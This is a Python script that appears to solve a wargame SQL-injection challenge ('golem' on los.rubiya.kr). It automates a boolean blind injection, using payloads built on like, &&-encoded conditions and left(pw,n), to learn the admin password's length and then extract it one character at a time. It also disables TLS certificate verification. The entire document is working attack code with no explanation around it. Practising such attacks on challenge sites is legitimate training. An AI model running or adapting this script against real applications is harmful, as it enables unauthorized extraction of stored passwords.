import requests

requests.packages.urllib3.disable_warnings()
sess = requests.session()
URL = 'https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php'
headers = {'Cookie': ''}

payload1 = "?pw='||id like 'admin'%26%26length(pw)like "
for i in range(1, 10):
    upPayload = payload1 + str(i) + '%23'
    res1 = sess.get(url=URL + upPayload, headers=headers, verify=False)
    if 'Hello admin' in res1.text:
        print('Password Length : %d' %i)
        break
    else:
        pass

Password = ''
for j in range(1, 9):
    for i in range(32, 128):
        payload2 = "?pw='||id like 'admin'%26%26left(pw,"+str(j)+") like '"+Password+chr(i)+"'%23"
        res2 = sess.get(url=URL + payload2, headers=headers, verify=False)
        if 'Hello admin' in res2.text:
            print('Password %d: %d' %(j,i))
            if 64 < i < 90:
                continue
            else:
                Password = Password + chr(i)
                break
        else:
            pass
print(Password)



